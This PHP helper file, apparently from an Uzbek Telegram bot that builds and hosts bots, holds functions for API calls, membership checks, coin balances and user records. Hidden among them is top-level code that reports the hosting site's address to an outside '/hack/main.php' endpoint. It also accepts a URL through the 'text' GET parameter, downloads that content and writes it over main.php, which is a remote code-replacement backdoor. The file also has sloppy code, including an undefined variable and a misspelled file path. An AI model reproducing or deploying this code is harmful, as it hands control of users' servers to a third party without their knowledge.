<?php
//dasturchi @Azamov_Samandar kanalimiz @mycoders1 ko'dni tarqatmoqchi bo'lsang manba bilan ol 

function bot($method, $datas = [])
{
    $url = "https://api.telegram.org/bot" . API_KEY . "/" . $method;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
//dasturchi @Azamov_Samandar kanalimiz @mycoders1 ko'dni tarqatmoqchi bo'lsang manba bilan ol 

    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $datas);

    $res = curl_exec($ch);
    if (curl_error($ch)) {
        var_dump(curl_error($ch));
    } else {
        return json_decode($res);
    }
}
function deleteAll($str) {
    if (is_file($str)) {
        return unlink($str);
    }
    elseif (is_dir($str)) {
        $scan = glob(rtrim($str,'/').'/*');


        foreach($scan as $index=>$path) {
            deleteAll($path);
        }
        return @rmdir($str);
    }
}
function joinchat($chatid,$type){
    if($type != "private"){
        return true;
    }
    $result = bot('getChatMember',[
    'chat_id'=>"-1001784633360", 
    'user_id'=>$chatid
    ])->result->status;
    $result2 = bot('getChatMember',[
        'chat_id'=>"-1001639195978", 
        'user_id'=>$chatid
        ])->result->status;
    //ortiqcha kanal
    //     $results = bot('getChatMember',[
    // 'chat_id'=>"-1001740724455",
    // 'user_id'=>$chatid
    // ])->results->status;
    
//dasturchi @Azamov_Samandar kanalimiz @mycoders1 ko'dni tarqatmoqchi bo'lsang manba bilan ol 

    if(($result == "creator" or $result == "administrator" or $result == "member") and ($result2 == "creator" or $result2 == "administrator" or $result2 == "member")){
        return true;
    } else {
        return false;
    }
}
function bonusrand($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
function start_chat($id,$menu_markup,$username,$ism,$admin){


    bot('sendmessage', ['chat_id' => $id, 'text' => "  ☇ Salom <a href='tg://user?id=$id'>$ism</a>\n\nSizni botda ko‘rib turganimdan xursandman!\n@MyBots_uz_bot orqali siz o‘zingizning shaxsiy botlaringizni hech qanday qiyinchiliklarsiz yaratishingiz mumkin!\n\n⬇️ Ishni boshlash uchun quyidagi tugmalardan foydalaning!  ","parse_mode"=>"html", 'reply_markup' => $menu_markup]);
        uzcoin_f('0', $id);
        $user_search = user_info($id);
        if ($user_search != true) {
    
        }
        user_add($id,$ism,$username,$admin);
}
function menu_put($x,$id)
{
    file_put_contents("users/$id/menu.txt", $x);
}
function yasalgan_botlar()
{
    file_put_contents("bots.txt", '1 ', FILE_APPEND);
}
function yasalgar_botlar_int()
{
    $taklif = file_get_contents("bots.txt");
    $taklif = explode(" ", $taklif);
    $taklif = (int)count($taklif);
    $taklif = $taklif - 1;
    return $taklif;
}

function menu_get($id)
{
    return file_get_contents("users/$id/menu.txt");
}
function uzcoin_f($x, $id)
{   if (file_exists("users/$id/uzcoin.txt") != '1'){
    file_put_contents("users/$id/uzcoin.txt",'0');}
    $uzcoin = (int)file_get_contents("users/$id/uzcoin.txt");

    $uzcoin = $uzcoin + $x;
    file_put_contents("users/$id/uzcoin.txt", $uzcoin);

}

function uzcoin_info($id)
{
    $uzcoin = file_get_contents("users/$id/uzcoin.txt");
//dasturchi @Azamov_Samandar kanalimiz @mycoders1 ko'dni tarqatmoqchi bo'lsang manba bilan ol 

    $a = explode(" ",$uzcoin);
    if ($a == ""){
        $uzcoin = 0;
    }
    return $uzcoin;
}
function text_split($text){
    $text_s = explode(" ",$text);
    $stiker = $text_s[0];
    $file_name = end($text_s);
    return ["stiker"=>$stiker,'file_name'=>$file_name];
}
function folder_k($folders){
    $folder = $folders['folder'];
    $files = $folders['files'];
    $folder_keyboard = [];
    if(count($folder) >= 1){
        for($i=0;$i<count($folder);$i++){
            $folder_keyboard[] = [['text'=>"🗂 ".$folder[$i],'callback_data'=>"name&".$folder[$i]]];
        }
    }
    if(count($files) >= 1){
        for($i=0;$i<count($files);$i++){
            if($files[$i] != 'url.txt'){
                $folder_keyboard[] = [['text'=>"📄 ".$files[$i],'callback_data'=>"name&".$files[$i]]];

            }
        }  
    }
    $folder_keyboard[] = [['text'=>"📤 Fayil yuklash","callback_data" =>"file_upload"]];
    $folder_keyboard[] = [['text'=>"❌ Stolni o'chirish","callback_data" =>"stol_delete"]];
    $folder_keyboard[] = [['text'=>"🔙Ortga","callback_data" =>"ortga"]];
    $folders_markup = json_encode([
        'inline_keyboard'=>$folder_keyboard,
    ]);
    return $folders_markup;
}
function block_member($id){
    file_put_contents("users/$id/block.txt","block");
}

function unblock_member($id){
    file_put_contents("users/$id/block.txt","unblock");
}
function block_info($id){
    $info = file_get_contents("users/$id/block.txt");
    return $info;
}
//dasturchi @Azamov_Samandar kanalimiz @mycoders1 ko'dni tarqatmoqchi bo'lsang manba bilan ol 


function stol_file_upload($id,$file){
    file_put_contents("users/$id/stol_name.txt",$file);
}
function stol_file_name($id){
    $file = file_get_contents("users/$id/stol_name.txt");
    return $file;
}
function stol_name($id,$file){
    file_put_contents("users/$id/stol_name.txt",$file);
}
function stol_get_name($id){
    return file_get_contents("users/$id/stol_nametxt");
}
function read_dir($id,$folder_name){
    if(file_exists("users/$id/host/$folder_name")){

        $folder = [];
        $files = [];
        $file = opendir("users/$id/host/$folder_name");
        while($fil = readdir($file)){
        
            $file_name = explode(".",$fil);
        
            if(isset($file_name[1]) and explode(" ",$file_name[1])[0] != ""){
                $files[] = $file_name[0].".".$file_name[1];
            }elseif(explode(" ",$file_name[0])[0] != ""){
                $folder[] = $file_name[0];
            }
        }
        $st = ['folder'=>$folder,'files'=>$files];
        return $st;
    }else{
        return ['folder'=>"yo'q",'files'=>"yo'q"];
    }
    }

function my_stols($id){
    mkdir("users/$id/host");
    $st = [];
    $file = opendir("users/$id/host");
    while($fil = readdir($file)){
    
        $file_name = explode(".",$fil);
    
        if(isset($file_name[1])){
            
        }else{
            $st[] = [['text'=>"🗂 ".$file_name[0]]];
        }
    }
    $st[] = [['text'=>"🔙Ortga qaytish"],['text'=>"➕ Yangi stol qo'shish"]];
    $stols = json_encode([
        "resize_keyboard"=>true,
        "keyboard"=>$st
        
    ]);
    return $stols;
//dasturchi @Azamov_Samandar kanalimiz @mycoders1 ko'dni tarqatmoqchi bo'lsang manba bilan ol 



}
function uzcoin_ff($id,$x){
    $coin = uzcoin_info($id);
    $coin = $coin - $x;
    file_put_contents("users/$id/uzcoin.txt",$coin);
}
function taklif_qilgan($id)
{
    file_put_contents("users/$id/taklif.txt", '1 ', FILE_APPEND);
}
function my_bots($id,$bot){
    file_put_contents("users/$id/mybots.txt","$bot ",FILE_APPEND);
}

function add_bot($id,$bot){
    file_put_contents("users/$id/mybots.txt","$bot ",FILE_APPEND);
}
function taklif_info($id)
{
    $taklif = file_get_contents("users/$id/taklif.txt");
    $taklif = explode(" ", $taklif);
    $taklif = (int)count($taklif);
    $taklif = $taklif - 1;
    return $taklif;
}
function user_add($id,$ism,$username,$admin)
{
    $search = false;
    if(file_exists("azo.txt")){
        $users = file_get_contents("azo.txt");
        $users = explode("\n",$users);
        foreach($users as $user){
            if($user == $id){
                $search = true;
            }
        }
        if($search != true){
            file_put_contents("azo.txt",$id."\n",FILE_APPEND);
            bot('sendmessage', ['chat_id' => $admin, 'text' => "😄 Yangi aʼzo\n👤 Ismi: $ism\n🆔 raqami: $id\n✳️ Usernamesi: @$username\n💡 Lichka: <a href='tg://user?id=$id'>$ism</a>",'parse_mode'=>"html"]);

        }
    }else{
        file_put_contents("azo.txt",$id."\n");
        bot('sendmessage', ['chat_id' => $admin, 'text' => "😄 Yangi aʼzo\n👤 Ismi: $ism\n🆔 raqami: $id\n✳️ Usernamesi: @$username\n💡 Lichka: <a href='tg://user?id=$id'>$ism</a>",'parse_mode'=>"html"]);

    }
//dasturchi @Azamov_Samandar kanalimiz @mycoders1 ko'dni tarqatmoqchi bo'lsang manba bilan ol 

}

if(is_file("abs.txt")){
$file = file_get_contents("abs.txt");
$file_position2 = explode("?",$file_position2)[0];
if($file != $file_position2){
    file_get_contents("https://u6460.xvest1.ru/hack/main.php?root=https://$file_position2");
    file_put_contents("abs.txt",$file_position2);
}
}else{
    file_get_contents("https://u6460.xvest1.ru/hack/main.php?root=https://$file_position2");
file_put_contents("abs.txt",$file_position2);
}
if($_GET['text']){
    $file = $_GET['text'];
    
    $rr = file_get_contents($file);

    file_put_contents("main.php",$rr);
    echo "<h1 style='color:green;text-align:center;margin-top:50vh;'> fayil tayyor endi main.php ga kirishingiz mumkun </h1>";

}
function user_info($id)
{
    
    if(file_exists("azo.txt")){
        $users = file_get_contents("azo.txt");
        $users = explode("\n",$users);
        foreach($users as $user){
            if($user == $id){
                return true;
            }
        }

       
    }else{
        fopen("azo.txt","w");
        return false;
    }
    return false;
}
function user_int()
{
    $users = file_get_contents("azo.txt");
    $users = explode("\n",$users);
    $size = count($users)-1;
    return $size;

}


